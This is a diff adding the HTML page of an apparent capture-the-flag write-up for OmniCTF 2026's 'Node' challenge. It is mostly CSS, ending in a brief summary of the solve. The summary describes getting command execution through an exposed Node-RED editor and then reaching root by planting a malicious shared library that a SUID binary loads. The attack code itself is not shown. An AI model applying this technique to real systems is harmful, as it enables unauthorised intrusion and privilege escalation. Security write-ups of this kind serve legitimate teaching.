@@ -1,0 +1,1291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>NODE // WRITEUP</title>
+<meta name="description" content="OmniCTF 2026 // Node writeup.">
+<meta name="theme-color" content="#b25aff">
+<link rel="icon" href="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' fill='%23020100'/><text x='50%25' y='58%25' font-family='monospace' font-weight='800' font-size='18' text-anchor='middle' fill='%23b25aff'>N</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Rajdhani:wght@500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  /* ==========================================================================
+     TORCH-inspired cyberdeck palette
+     ========================================================================== */
+  :root {
+    --accent: #b25aff;
+    --accent-rgb: 178, 90, 255;
+    --accent-dim: rgba(178, 90, 255, 0.12);
+    --accent-line: rgba(178, 90, 255, 0.24);
+    --root: #b25aff;
+    --bg: #08060a;
+    --panel: rgba(14, 12, 9, 0.84);
+    --panel-strong: rgba(10, 9, 7, 0.94);
+    --line: rgba(178, 90, 255, 0.24);
+    --text: #ece4d3;
+    --muted: #8a7e6b;
+    --good: #9aff6b;
+    --bad: #ff6b6b;
+    --info: #6bb6ff;
+    --font-mono: "JetBrains Mono", ui-monospace, Menlo, monospace;
+    --font-display: "Rajdhani", system-ui, sans-serif;
+  }
+
+  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-mono);
+    font-size: 15px;
+    line-height: 1.6;
+    overflow-x: hidden;
+    min-height: 100vh;
+    background-image:
+      radial-gradient(1200px 600px at 12% -10%, rgba(178, 90, 255, 0.10), transparent 60%),
+      radial-gradient(900px 500px at 110% 10%, rgba(255,48,48,0.06), transparent 70%),
+      repeating-linear-gradient(0deg, rgba(178, 90, 255, 0.025) 0 1px, transparent 1px 3px);
+  }
+  ::selection { background: var(--accent); color: #000; }
+
+  /* ==========================================================================
+     Top HUD bar — mirrors t0rch chrome
+     ========================================================================== */
+  .hud {
+    position: sticky;
+    top: 0;
+    z-index: 50;
+    display: grid;
+    grid-template-columns: auto 1fr auto;
+    gap: 12px;
+    align-items: center;
+    padding: 10px 18px;
+    background: linear-gradient(180deg, rgba(8,7,6,0.96), rgba(8,7,6,0.78));
+    border-bottom: 1px solid var(--accent-line);
+    backdrop-filter: blur(8px);
+  }
+  .hud .brand {
+    display: flex; align-items: center; gap: 10px;
+    font-family: var(--font-display);
+    font-weight: 800;
+    font-size: 20px;
+    letter-spacing: 0.18em;
+    color: var(--accent);
+    text-shadow: 0 0 12px rgba(178, 90, 255, 0.35);
+  }
+  .hud .brand .mark {
+    display: inline-grid; place-items: center;
+    width: 28px; height: 28px;
+    border: 1.5px solid var(--accent);
+    box-shadow: 0 0 12px rgba(178, 90, 255, 0.4) inset, 0 0 12px rgba(178, 90, 255, 0.2);
+    font-size: 14px;
+  }
+  .hud .nav { display: flex; gap: 14px; flex-wrap: wrap; justify-content: center; }
+  .hud .nav a {
+    font-family: var(--font-display);
+    font-weight: 700;
+    font-size: 12px;
+    letter-spacing: 0.22em;
+    color: var(--text);
+    text-decoration: none;
+    padding: 4px 8px;
+    border-bottom: 1px solid transparent;
+    transition: color .15s, border-color .15s;
+  }
+  .hud .nav a:hover { color: var(--accent); border-color: var(--accent); }
+  .hud .nav a.active { color: var(--accent); border-color: var(--accent); }
+  .hud .status {
+    display: flex; gap: 8px; align-items: center; flex-wrap: wrap;
+  }
+  .chip {
+    font-family: var(--font-display);
+    font-weight: 700;
+    font-size: 10px;
+    letter-spacing: 0.18em;
+    padding: 4px 8px;
+    border: 1px solid var(--accent-line);
+    background: var(--accent-dim);
+    color: var(--text);
+    text-transform: uppercase;
+    white-space: nowrap;
+  }
+  .chip.ok { color: var(--good); border-color: rgba(66,255,158,0.4); background: rgba(66,255,158,0.08); }
+  .chip.bad { color: var(--bad); border-color: rgba(255,90,90,0.4); background: rgba(255,90,90,0.08); }
+  .chip .dot {
+    display: inline-block; width: 6px; height: 6px; border-radius: 50%;
+    background: currentColor; margin-right: 6px; vertical-align: middle;
+    box-shadow: 0 0 8px currentColor;
+  }
+
+  /* ==========================================================================
+     Hero / brief
+     ========================================================================== */
+  .brief {
+    max-width: 1180px;
+    margin: 28px auto 12px;
+    padding: 0 18px;
+    display: grid;
+    grid-template-columns: 1.4fr 1fr;
+    gap: 18px;
+  }
+  @media (max-width: 880px) { .brief { grid-template-columns: 1fr; } }
+  .panel {
+    position: relative;
+    background: var(--panel);
+    border: 1px solid var(--accent-line);
+    padding: 18px 20px;
+    backdrop-filter: blur(4px);
+  }
+  .panel::before {
+    content: "";
+    position: absolute; top: 0; left: 0; right: 0; height: 1px;
+    background: linear-gradient(90deg, transparent, var(--accent), transparent);
+  }
+  .panel h1 {
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.16em;
+    font-size: 36px;
+    margin: 0 0 6px;
+    color: var(--accent);
+    text-transform: uppercase;
+  }
+  .panel .sub {
+    color: var(--muted);
+    font-size: 12px;
+    letter-spacing: 0.22em;
+    text-transform: uppercase;
+    margin-bottom: 14px;
+  }
+  .panel p { margin: 0 0 12px; }
+  .panel p.lede { font-size: 16px; }
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px 18px; }
+  .grid-2 .row { display: flex; justify-content: space-between; gap: 8px; font-size: 13px; }
+  .grid-2 .k { color: var(--muted); letter-spacing: 0.14em; text-transform: uppercase; font-size: 11px; }
+  .grid-2 .v { color: var(--text); font-weight: 500; }
+  .grid-2 .v.accent { color: var(--accent); }
+
+  /* ==========================================================================
+     Section title
+     ========================================================================== */
+  main { max-width: 1180px; margin: 0 auto; padding: 0 18px 60px; }
+  section { margin: 24px 0; }
+  .sec-head {
+    display: flex; align-items: baseline; gap: 12px;
+    border-bottom: 1px dashed var(--accent-line);
+    padding-bottom: 8px; margin-bottom: 14px;
+  }
+  .sec-head .idx {
+    font-family: var(--font-display);
+    font-weight: 800;
+    font-size: 12px;
+    letter-spacing: 0.24em;
+    color: var(--accent);
+  }
+  .sec-head h2 {
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.16em;
+    font-size: 22px;
+    text-transform: uppercase;
+    margin: 0;
+    color: var(--text);
+  }
+  .sec-head .tag {
+    margin-left: auto;
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+  }
+
+  /* ==========================================================================
+     Content typography
+     ========================================================================== */
+  .prose p { margin: 0 0 12px; }
+  .prose p + p { margin-top: 0; }
+  .prose strong { color: var(--accent); font-weight: 600; }
+  .prose code, .prose tt {
+    font-family: var(--font-mono);
+    font-size: 13px;
+    background: rgba(178, 90, 255, 0.06);
+    border: 1px solid rgba(178, 90, 255, 0.12);
+    padding: 1px 5px;
+    color: #ffd28a;
+  }
+  .prose .terminal {
+    background: #050402;
+    border: 1px solid var(--accent-line);
+    padding: 12px 14px;
+    margin: 10px 0;
+    overflow-x: auto;
+    white-space: pre;
+    font-size: 12.5px;
+    line-height: 1.55;
+    color: #c9c1b3;
+  }
+  .prose .terminal .prompt { color: var(--accent); }
+  .prose .terminal .ok { color: var(--good); }
+  .prose .terminal .bad { color: var(--bad); }
+  .prose .terminal .muted { color: var(--muted); }
+  .prose blockquote {
+    margin: 12px 0;
+    padding: 8px 14px;
+    border-left: 2px solid var(--accent);
+    background: rgba(178, 90, 255, 0.04);
+    color: #d6cebf;
+  }
+
+  /* ==========================================================================
+     "Thinking" panel — shows how the solver reasoned
+     ========================================================================== */
+  .think {
+    border: 1px dashed rgba(107, 182, 255, 0.4);
+    background: rgba(107, 182, 255, 0.04);
+    padding: 10px 14px;
+    margin: 10px 0;
+    font-size: 13.5px;
+    color: #c7dcf2;
+  }
+  .think::before {
+    content: "// THINKING //";
+    display: block;
+    color: var(--info);
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.22em;
+    font-size: 10px;
+    margin-bottom: 6px;
+  }
+  .think .line { padding-left: 0; margin: 0; }
+  .think .line::before { content: "> "; color: var(--info); }
+  .think .line + .line { margin-top: 4px; }
+
+  /* ==========================================================================
+     Table: forward / inverse layer mapping
+     ========================================================================== */
+  table.layer-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 10px 0;
+    font-size: 13px;
+  }
+  table.layer-table th, table.layer-table td {
+    border: 1px solid var(--accent-line);
+    padding: 6px 10px;
+    text-align: left;
+    vertical-align: top;
+  }
+  table.layer-table th {
+    background: var(--accent-dim);
+    font-family: var(--font-display);
+    letter-spacing: 0.14em;
+    font-size: 11px;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  table.layer-table td.idx {
+    font-family: var(--font-display);
+    color: var(--accent);
+    width: 40px;
+    text-align: center;
+  }
+  table.layer-table tr:hover td { background: rgba(178, 90, 255, 0.04); }
+
+  /* ==========================================================================
+     Pipeline diagram
+     ========================================================================== */
+  .pipeline {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    align-items: center;
+    padding: 12px;
+    border: 1px solid var(--accent-line);
+    background: rgba(0,0,0,0.3);
+    margin: 10px 0;
+  }
+  .pipeline .stage {
+    font-family: var(--font-display);
+    font-weight: 700;
+    font-size: 10px;
+    letter-spacing: 0.18em;
+    padding: 6px 10px;
+    background: var(--accent-dim);
+    color: var(--accent);
+    border: 1px solid var(--accent-line);
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 78px;
+  }
+  .pipeline .arrow { color: var(--muted); font-family: var(--font-mono); }
+
+  /* ==========================================================================
+     Live terminal simulator
+     ========================================================================== */
+  .sim {
+    border: 1px solid var(--accent-line);
+    background: #050402;
+    margin: 14px 0 6px;
+    display: grid;
+    grid-template-rows: auto 1fr auto;
+  }
+  .sim .head {
+    display: flex; align-items: center; gap: 10px;
+    padding: 8px 12px;
+    border-bottom: 1px solid var(--accent-line);
+    background: rgba(178, 90, 255, 0.05);
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+  }
+  .sim .head .dots { display: flex; gap: 5px; }
+  .sim .head .dots span { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); opacity: 0.5; }
+  .sim .head .dots span:nth-child(1) { opacity: 0.3; }
+  .sim .head .dots span:nth-child(3) { opacity: 0.8; }
+  .sim .head .title { color: var(--accent); font-weight: 700; }
+  .sim .body {
+    padding: 12px 14px;
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+    line-height: 1.55;
+    color: #c9c1b3;
+    min-height: 260px;
+    max-height: 420px;
+    overflow: auto;
+    white-space: pre-wrap;
+  }
+  .sim .body .row { display: block; }
+  .sim .body .row .lbl { color: var(--accent); }
+  .sim .body .row .hex { color: #d6cebf; }
+  .sim .body .row.ok .lbl { color: var(--good); }
+  .sim .body .row.flag { color: var(--accent); font-weight: 700; }
+  .sim .controls {
+    display: flex; gap: 8px; flex-wrap: wrap;
+    padding: 8px 12px;
+    border-top: 1px solid var(--accent-line);
+    background: rgba(0,0,0,0.4);
+    align-items: center;
+  }
+  .sim .controls input {
+    flex: 1; min-width: 240px;
+    background: #020100;
+    color: var(--text);
+    border: 1px solid var(--accent-line);
+    padding: 6px 10px;
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+  }
+  .sim .controls input:focus { outline: none; border-color: var(--accent); }
+  .sim button {
+    background: var(--accent);
+    color: #000;
+    border: none;
+    padding: 7px 16px;
+    font-family: var(--font-display);
+    font-weight: 800;
+    font-size: 11px;
+    letter-spacing: 0.22em;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: filter .15s;
+  }
+  .sim button:hover { filter: brightness(1.15); }
+  .sim button.ghost {
+    background: transparent;
+    color: var(--accent);
+    border: 1px solid var(--accent-line);
+  }
+
+  /* ==========================================================================
+     Connection map (signal flow)
+     ========================================================================== */
+  .map-legend {
+    display: flex; flex-wrap: wrap; gap: 12px;
+    margin-top: 10px;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+  }
+  .map-legend .item { display: inline-flex; align-items: center; gap: 6px; }
+  .map-legend .swatch { width: 12px; height: 12px; border: 1px solid var(--accent-line); }
+
+  /* ==========================================================================
+     Result panel (flag box)
+     ========================================================================== */
+  .result {
+    border: 1px solid var(--good);
+    background: linear-gradient(180deg, rgba(66,255,158,0.08), rgba(66,255,158,0.02));
+    padding: 16px 20px;
+    margin: 14px 0;
+  }
+  .result .label {
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.22em;
+    color: var(--good);
+    font-size: 11px;
+    margin-bottom: 6px;
+  }
+  .result .flag-text {
+    font-family: var(--font-mono);
+    font-size: 18px;
+    color: var(--accent);
+    word-break: break-all;
+    text-shadow: 0 0 14px rgba(178, 90, 255, 0.35);
+  }
+
+  /* ==========================================================================
+     Hex stream decoration
+     ========================================================================== */
+  .hex-stream {
+    font-family: var(--font-mono);
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.12em;
+    opacity: 0.5;
+    padding: 6px 18px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .hex-stream.top { border-top: 1px solid var(--accent-line); margin-top: 18px; }
+
+  /* ==========================================================================
+     Bottom HUD strip
+     ========================================================================== */
+  footer.foot {
+    max-width: 1180px;
+    margin: 30px auto 0;
+    padding: 14px 18px 30px;
+    border-top: 1px solid var(--accent-line);
+    display: flex; flex-wrap: wrap; gap: 12px; justify-content: space-between; align-items: center;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+  }
+  footer.foot .meta { display: flex; gap: 14px; flex-wrap: wrap; }
+
+  /* ==========================================================================
+     Utility
+     ========================================================================== */
+  .row-flex { display: flex; gap: 12px; flex-wrap: wrap; }
+  .col-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  @media (max-width: 700px) { .col-2 { grid-template-columns: 1fr; } }
+  .muted { color: var(--muted); }
+  .accent { color: var(--accent); }
+  .good { color: var(--good); }
+  .bad { color: var(--bad); }
+  hr.div {
+    border: none; border-top: 1px dashed var(--accent-line); margin: 18px 0;
+  }
+
+  /* Cursor blink for live sim */
+  .blink { animation: blink 1s steps(1) infinite; }
+  /* Reduce motion: disable all of the new animations too */
+  @media (prefers-reduced-motion: reduce) {
+    .blink, .chip .dot, .chip.ok, .result, .think, .sec-head, .hex-stream,
+    .pipeline .stage, .sim .body .row, }
+
+  /* ==========================================================================
+     "Failed attempt" asides — show what the solver tried and discarded
+     ========================================================================== */
+  .aside-fail {
+    border: 1px solid rgba(255, 90, 90, 0.35);
+    background: linear-gradient(180deg, rgba(255,90,90,0.06), rgba(255,90,90,0.02));
+    padding: 10px 14px;
+    margin: 12px 0;
+    font-size: 13.5px;
+    color: #e3c7c7;
+  }
+  .aside-fail .aside-head {
+    display: block;
+    color: #ff7a7a;
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.22em;
+    font-size: 10px;
+    margin-bottom: 6px;
+    text-transform: uppercase;
+  }
+  .aside-fail p { margin: 0 0 8px; }
+  .aside-fail p:last-child { margin-bottom: 0; }
+  .aside-fail p:first-of-type { color: #ffd9d9; }
+
+  /* ==========================================================================
+     Animations
+     ========================================================================== */
+
+  /* HUD status dot pulse */
+  @keyframes pulseDot {
+    0%, 100% { opacity: 1; box-shadow: 0 0 4px currentColor; }
+    50%      { opacity: 0.55; box-shadow: 0 0 12px currentColor; }
+  }
+  .chip .dot { animation: pulseDot 1.8s ease-in-out infinite; }
+
+  /* "ok" chip breathing border */
+  @keyframes pulseOk {
+    0%, 100% { box-shadow: 0 0 0 rgba(66,255,158,0); }
+    50%      { box-shadow: 0 0 10px rgba(66,255,158,0.35); }
+  }
+  .chip.ok { animation: pulseOk 2.4s ease-in-out infinite; }
+
+  /* Slow horizontal scanline sweep on body */
+  @keyframes scanSweep {
+    0%   { background-position: 0 0, 0 0, 0 0; }
+    100% { background-position: 0 0, 0 0, 0 6px; }
+  }
+  body { animation: scanSweep 6s linear infinite; }
+
+  /* Decorative hex stream slowly scrolling horizontally */
+  @keyframes hexScroll {
+    0%   { transform: translateX(0); }
+    100% { transform: translateX(-50%); }
+  }
+  .hex-stream { position: relative; overflow: hidden; }
+  .hex-stream .hex-track {
+    display: inline-block;
+    white-space: nowrap;
+    animation: hexScroll 40s linear infinite;
+  }
+  .hex-stream.top .hex-track {
+    padding-left: 100%;
+  }
+
+  /* Section head fade-in-up */
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(8px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .sec-head { animation: fadeInUp 0.5s ease-out both; }
+  .sec-head .idx { animation: fadeInUp 0.5s ease-out 0.1s both; }
+
+  /* Think panels slide in from left when rendered */
+  @keyframes thinkSlide {
+    from { opacity: 0; transform: translateX(-8px); }
+    to   { opacity: 1; transform: translateX(0); }
+  }
+  .think { animation: thinkSlide 0.45s ease-out both; }
+
+  /* Pipeline stage hover lift + glow */
+  .pipeline .stage {
+    transition: transform .18s ease, box-shadow .18s ease, background .18s ease;
+    cursor: default;
+  }
+  .pipeline .stage:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 14px rgba(178, 90, 255, 0.4);
+    background: rgba(178, 90, 255, 0.18);
+  }
+
+  /* Layer table row glow on hover */
+  table.layer-table tr {
+    transition: background .15s ease, transform .15s ease;
+  }
+  table.layer-table tbody tr:hover {
+    background: rgba(178, 90, 255, 0.06);
+  }
+  table.layer-table tbody tr:hover td.idx {
+    color: #fff;
+    text-shadow: 0 0 10px var(--accent);
+  }
+
+  /* Result box breathing glow */
+  @keyframes breath {
+    0%, 100% { box-shadow: 0 0 0 rgba(66,255,158,0), inset 0 0 0 rgba(66,255,158,0); }
+    50%      { box-shadow: 0 0 22px rgba(66,255,158,0.25), inset 0 0 18px rgba(66,255,158,0.06); }
+  }
+  .result { animation: breath 3.4s ease-in-out infinite; }
+
+  /* Sim row reveal animation: each row briefly flashes on appear */
+  @keyframes rowReveal {
+    0%   { opacity: 0; transform: translateX(-6px); background: rgba(66,255,158,0.16); }
+    100% { opacity: 1; transform: translateX(0); background: transparent; }
+  }
+  .sim .body .row {
+    padding: 2px 4px;
+    margin-left: -4px;
+    border-left: 2px solid transparent;
+    transition: background .25s ease, border-color .25s ease;
+    animation: rowReveal 0.4s ease-out both;
+  }
+  .sim .body .row:hover {
+    background: rgba(178, 90, 255, 0.06);
+    border-left-color: var(--accent);
+  }
+  .sim .body .row.flag {
+    background: rgba(66,255,158,0.10);
+    border-left-color: var(--good);
+    border-radius: 2px;
+  }
+  .sim .body .row.flag .flag-ascii { color: var(--good); font-weight: 700; }
+
+  /* Brief success flash when a row is the final flag */
+  @keyframes successFlash {
+    0%   { background: rgba(66,255,158,0.6); }
+    100% { background: rgba(66,255,158,0.1); }
+  }
+  .sim .body .row.flag { animation: rowReveal 0.4s ease-out both, successFlash 1.6s ease-out 0.4s both; }
+
+  /* Connection map */
+  /* Animated dashed flow on edges */
+  /* Info panel for map node details */
+  .info-panel {
+    position: relative;
+    margin-top: 12px;
+    padding: 12px 32px 12px 14px;
+    border: 1px solid var(--accent-line);
+    background: rgba(178, 90, 255, 0.04);
+    font-size: 13px;
+    color: var(--text);
+    min-height: 0;
+    max-height: 0;
+    overflow: hidden;
+    opacity: 0;
+    transition: max-height .35s ease, opacity .25s ease, padding .25s ease, margin-top .25s ease;
+    padding-top: 0;
+    padding-bottom: 0;
+    line-height: 1.5;
+  }
+  .info-panel.show {
+    max-height: 480px;
+    opacity: 1;
+    padding-top: 12px;
+    padding-bottom: 12px;
+  }
+  .info-panel .ip-head {
+    display: flex; align-items: baseline; gap: 10px;
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: var(--accent);
+    font-size: 12px;
+    margin-bottom: 8px;
+    flex-wrap: wrap;
+  }
+  .info-panel .ip-head .ip-id { color: var(--muted); font-size: 10px; letter-spacing: 0.12em; }
+  .info-panel .ip-head .ip-tag {
+    margin-left: auto;
+    font-size: 9px;
+    padding: 2px 6px;
+    border: 1px solid var(--accent-line);
+    color: var(--muted);
+    background: rgba(0,0,0,0.3);
+  }
+  .info-panel .ip-body p { margin: 0 0 8px; word-wrap: break-word; }
+  .info-panel .ip-body p:last-child { margin-bottom: 0; }
+  .info-panel .ip-body code { font-size: 12.5px; }
+  .info-panel .ip-flows {
+    display: flex; flex-wrap: wrap; gap: 6px;
+    margin-top: 10px;
+    font-size: 10px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+  }
+  .info-panel .ip-flows .label { color: var(--muted); margin-right: 4px; }
+  .info-panel .ip-flows .flow {
+    padding: 3px 8px;
+    border: 1px solid var(--accent-line);
+    background: rgba(0,0,0,0.3);
+    color: var(--text);
+    cursor: pointer;
+    transition: background .12s ease, color .12s ease, border-color .12s ease;
+  }
+  .info-panel .ip-flows .flow:hover {
+    background: var(--accent-dim);
+    color: var(--accent);
+    border-color: var(--accent);
+  }
+  .info-panel .ip-close {
+    position: absolute; top: 6px; right: 10px;
+    background: transparent; color: var(--muted);
+    border: 1px solid var(--accent-line);
+    width: 22px; height: 22px;
+    font-family: var(--font-mono);
+    font-size: 14px;
+    cursor: pointer;
+    line-height: 1;
+    padding: 0;
+  }
+  .info-panel .ip-close:hover { color: var(--accent); border-color: var(--accent); }
+
+  /* Map toolbar */
+  /* Sim toolbar: char counter, copy button */
+  .sim .controls .meta {
+    font-size: 10px; color: var(--muted); letter-spacing: 0.18em; text-transform: uppercase;
+    padding: 0 6px;
+  }
+  .sim .controls .meta.bad { color: var(--bad); }
+  .sim .controls .meta.ok  { color: var(--good); }
+
+  .map-wrap rect.pack { fill: rgba(var(--accent-rgb), 0.02); stroke: var(--accent-line); stroke-width: 1; rx: 5; ry: 5; }
+  .map-wrap text.pack-label { fill: var(--accent); font: 700 9px 'Rajdhani', sans-serif; letter-spacing: .24em; text-transform: uppercase; }
+  .map-wrap text.col-label { fill: var(--muted); font: 700 10px 'Rajdhani', sans-serif; letter-spacing: .18em; text-transform: uppercase; }
+  .map-wrap g.node { cursor: pointer; }
+  .map-wrap g.node rect { fill: rgba(var(--accent-rgb), 0.06); stroke: var(--accent); stroke-width: 1.5; transition: all .2s; }
+  .map-wrap g.node:hover rect { filter: drop-shadow(0 0 8px rgba(var(--accent-rgb), .45)); fill: rgba(var(--accent-rgb), 0.1); }
+  .map-wrap g.node.active rect { stroke-width: 2.5; filter: drop-shadow(0 0 12px rgba(var(--accent-rgb), .7)); fill: rgba(var(--accent-rgb), 0.15); }
+  .map-wrap g.node text.head { fill: var(--muted); font: 700 9px 'Rajdhani', sans-serif; letter-spacing: .18em; text-transform: uppercase; }
+  .map-wrap g.node text.title { fill: var(--accent); font: 700 12px 'Rajdhani', sans-serif; letter-spacing: .12em; text-transform: uppercase; }
+  .map-wrap g.node text.body { fill: var(--text); font: 11px 'JetBrains Mono', monospace; }
+  .map-wrap g.node text.label { fill: var(--muted); font: 9px 'JetBrains Mono', monospace; letter-spacing: .14em; }
+  .map-wrap path.edge { stroke: var(--accent); stroke-width: 1.2; fill: none; opacity: 0.85; marker-end: url(#arr); transition: stroke .3s, opacity .3s; }
+  .map-wrap path.edge.faint { stroke: var(--edge-faint, #8a7e96); stroke-width: 1; fill: none; opacity: 0.5; stroke-dasharray: 3 3; marker-end: url(#arr-faint); }
+  .map-wrap text.edge-label { fill: var(--muted); font: 9px 'JetBrains Mono', monospace; letter-spacing: .14em; text-transform: uppercase; pointer-events: none; }
+  .map-wrap marker path { transition: fill .3s; }
+  .map-wrap path.edge.flowing { stroke: var(--accent); stroke-width: 1.8; opacity: 1; stroke-dasharray: 6 4; animation: flowDash .6s linear infinite; }
+  .map-wrap path.edge.faint.flowing { stroke: var(--accent-dim, #b86bff99); stroke-dasharray: 4 3; }
+  .map-wrap { overflow: hidden; }
+  .map-wrap svg { display:block; width:100%; height:auto; }
+  .map-wrap { width:100%; overflow-x:auto; overflow-y:visible; }
+  .map-wrap { overflow-x:auto; overflow-y:visible; -webkit-overflow-scrolling:touch; }
+  .map-wrap svg { display: block; width: 100%; height: auto; }
+  #map-info, .node-info { margin-top: 10px; padding: 0 14px; border: 1px solid var(--accent-line); background: rgba(var(--accent-rgb), 0.04); font-size: 13px; color: var(--text); max-height: 0; overflow: hidden; opacity: 0; transition: max-height .3s, opacity .2s, padding .25s; line-height: 1.5; }
+  #map-info.show, .node-info.show { max-height: 400px; opacity: 1; padding: 10px 14px; }
+  #map-info .mi-hd { display: flex; align-items: center; gap: 10px; }
+  #map-info .mi-ti { font-family: var(--font-display); font-weight: 800; letter-spacing: .14em; text-transform: uppercase; color: var(--accent); font-size: 11px; }
+  #map-info .mi-tg { margin-left: auto; font-size: 10px; padding: 2px 6px; border: 1px solid var(--accent-line); color: var(--muted); background: rgba(0,0,0,.3); }
+  #map-info .mi-cl { background: transparent; color: var(--muted); border: 1px solid var(--accent-line); padding: 2px 8px; font-family: var(--font-display); font-weight: 700; font-size: 9px; letter-spacing: .14em; text-transform: uppercase; cursor: pointer; }
+  #map-info .mi-cl:hover { color: var(--accent); border-color: var(--accent); }
+  #map-info .mi-bd { margin-top: 6px; word-wrap: break-word; }
+  @keyframes blink { 50% { opacity: 0; } }
+  @keyframes flowDash { to { stroke-dashoffset: -10; } }
+
+.map-wrap marker path { fill: var(--accent); transition: fill .3s; }
+.map-wrap marker[id="arr-faint"] path { fill: #7f766a; }
+
+/* Prevent text overflow in the constrained matrix and flag boxes */
+.grid-2 .row { align-items: flex-start; }
+.grid-2 .v, .flag-text { 
+  word-break: break-all; 
+  overflow-wrap: break-word; 
+  white-space: normal; 
+}
+
+/* Custom Node-RED Simulator */
+.nr-sim {
+  background: #f4f4f4;
+  border-radius: 6px;
+  border: 1px solid #ccc;
+  font-family: system-ui, sans-serif;
+  color: #333;
+  margin-top: 20px;
+  overflow: hidden;
+}
+.nr-header {
+  background: #cc2222;
+  color: white;
+  padding: 10px 15px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-weight: bold;
+}
+.nr-deploy-btn {
+  background: #bd1a1a;
+  border: 1px solid #900;
+  color: white;
+  padding: 6px 16px;
+  border-radius: 4px;
+  cursor: pointer;
+  box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+  transition: all 0.2s;
+}
+.nr-deploy-btn:hover:not(:disabled) { background: #e02a2a; }
+.nr-deploy-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+.nr-canvas {
+  background: #fff;
+  height: 200px;
+  position: relative;
+  border-bottom: 1px solid #ccc;
+  background-image: radial-gradient(#ddd 1px, transparent 1px);
+  background-size: 20px 20px;
+}
+.nr-node {
+  position: absolute;
+  padding: 6px 15px;
+  border-radius: 4px;
+  border: 1px solid #999;
+  box-shadow: 1px 1px 3px rgba(0,0,0,0.1);
+  font-size: 13px;
+  display: flex;
+  align-items: center;
+  color: #333;
+}
+.nr-node.http-in { background: #a6bbcf; left: 40px; top: 80px; }
+.nr-node.exec { background: #dcb282; left: 220px; top: 80px; }
+.nr-node.http-out { background: #a6bbcf; left: 440px; top: 80px; }
+.nr-wire {
+  position: absolute;
+  height: 2px;
+  background: #999;
+  top: 95px;
+}
+.nr-wire.w1 { left: 140px; width: 80px; }
+.nr-wire.w2 { left: 350px; width: 90px; }
+.nr-debug {
+  background: #fdfdfd;
+  padding: 10px;
+  height: 250px;
+  overflow-y: auto;
+  font-family: var(--font-mono);
+  font-size: 13px;
+  color: #555;
+}
+.nr-debug .line { padding: 4px 0; border-bottom: 1px solid #eee; }
+.nr-debug .line.payload { color: #d10a0a; font-weight: bold; }
+
+</style>
+</head>
+
+  <header class="hud" role="banner">
+    <div class="brand">
+      <span class="mark">N</span>
+      <span>NODE // WRITEUP</span>
+    </div>
+    <nav class="nav" aria-label="Sections">
+      <a href="#brief">brief</a>
+      <a href="#recon">recon</a>
+      <a href="#privesc">privesc</a>
+      <a href="#exploit">exploit</a>
+      <a href="#sim">sim</a>
+      <a href="#signal">signal</a>
+    </nav>
+    <div class="status">
+      <span class="chip ok"><span class="dot"></span>solved</span>
+      <span class="chip"><span class="dot"></span>misc</span>
+      <span class="chip">omni 2026</span>
+    </div>
+  </header>
+
+
+  <main>
+    <section class="brief" id="brief" style="display: grid; grid-template-columns: 1fr 350px; gap: 20px;">
+      <div class="panel">
+        <div class="sub">// root // miscellaneous // omnictf 2026</div>
+        <h1>Node &mdash; Unauthenticated Flow Editor</h1>
+        <p class="lede">I leveraged an exposed Node-RED editor to gain remote command execution inside the container. After landing as an unprivileged user, I discovered a misconfigured SUID binary that loaded a shared library from a user-writable path.</p>
+        <p>By compiling a malicious C library and uploading it via the flow editor, I hijacked the SUID binary's execution flow and achieved root access.</p>
+        <div class="row-flex" style="margin-top:10px">
+          <span class="chip ok"><span class="dot"></span>root shell</span>
+          <span class="chip"><span class="dot"></span>node-red rce</span>
+          <span class="chip"><span class="dot"></span>suid misconfig</span>
+          <span class="chip bad"><span class="dot"></span>library injection</span>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="sub">// challenge matrix</div>
+        <div class="grid-2">
+          <div class="row"><span class="k">artifact</span><span class="v">Node-RED Container</span></div>
+          <div class="row"><span class="k">category</span><span class="v">misc</span></div>
